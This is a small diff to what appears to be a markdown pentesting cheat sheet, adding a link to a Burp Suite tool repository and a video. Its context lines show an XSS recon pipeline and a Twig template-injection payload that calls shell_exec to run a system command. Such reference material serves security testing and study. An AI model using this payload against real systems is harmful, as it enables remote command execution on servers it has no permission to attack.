@@ -115,5 +115,7 @@ cat target.txt | waybackurls | gf xss | kxss
 ```sh
 {{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('dir)}}
 ```
+**Tool for Burpsuite**
+> ***https://github.com/antichown/0x94TR***
 > ***For more info***
 > ***https://youtu.be/TrQi9iwtA0k***
